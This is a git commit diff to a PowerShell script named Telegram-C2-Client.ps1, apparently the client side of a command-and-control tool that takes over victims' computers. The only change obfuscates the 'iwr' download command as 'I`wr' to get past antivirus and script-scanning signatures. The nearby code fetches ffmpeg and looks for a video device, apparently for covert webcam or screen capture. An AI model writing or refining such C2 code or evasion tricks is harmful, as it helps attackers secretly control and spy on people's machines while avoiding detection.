8bdbac4a830a38328921bb0ad708be6e1d381433
poiuztreq <harder.alex@gmx.net>
2023-11-24 00:11:33 +0100

    fixed again

--- Command-and-Control/Telegram-C2-Client.ps1
+++ Command-and-Control/Telegram-C2-Client.ps1
@@ -502,7 +502,7 @@ if (-not (Test-Path -Path $tempFolder)) {
 $ffmpegDownload = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
 $ffmpegZip = "$tempFolder\ffmpeg-release-essentials.zip"
 if (-not (Test-Path -Path $ffmpegZip)) {
-    iwr -Uri $ffmpegDownload -OutFile $ffmpegZip
+    I`wr -Uri $ffmpegDownload -OutFile $ffmpegZip
 }
 Expand-Archive -Path $ffmpegZip -DestinationPath $tempFolder -Force
 $videoDevice = $null
